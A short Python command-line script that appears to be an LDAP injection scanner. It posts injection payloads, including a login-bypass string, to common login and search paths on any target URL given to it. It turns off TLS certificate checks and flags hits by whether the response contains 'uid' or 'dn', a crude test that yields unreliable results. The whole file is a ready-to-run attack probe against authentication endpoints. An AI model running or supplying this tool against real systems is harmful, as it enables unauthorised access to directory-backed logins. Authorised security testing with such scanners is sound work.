#!/usr/bin/env python3
"""
LDAP Injection Scanner
Tests LDAP endpoints for injection
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    '*)(uid=*))(|(uid=*',
    'admin)(&(password=*',
    '*)(objectClass=*',
]

def scan(target):
    print(f"[*] LDAP Injection Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    ldap_paths = ['/ldap', '/login', '/auth', '/search']
    
    for path in ldap_paths:
        for payload in PAYLOADS:
            try:
                r = requests.post(target + path, data={'username': payload}, timeout=10, verify=False)
                if 'uid' in r.text.lower() or 'dn' in r.text.lower():
                    print(f"[!] Possible LDAPi: {path}")
                    found.append(path)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} potential issues")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='LDAPi Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)